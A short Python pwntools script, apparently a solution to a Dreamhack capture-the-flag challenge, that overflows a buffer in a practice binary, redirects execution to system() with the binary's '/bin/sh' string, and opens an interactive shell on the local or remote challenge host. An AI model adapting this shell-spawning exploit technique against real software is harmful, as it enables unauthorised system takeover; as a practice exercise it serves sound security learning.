#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 9049)

    return r


def main():
    r = conn()

    payload = b"A" * 0x18
    payload += p64(0x435e38)
    payload += b"A" * 0x8
    payload += p64(exe.symbols["system"])
    payload += b"A" * 0x50
    payload += p64(next(exe.search(b"/bin/sh\x00")))

    r.sendlineafter(b"input: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
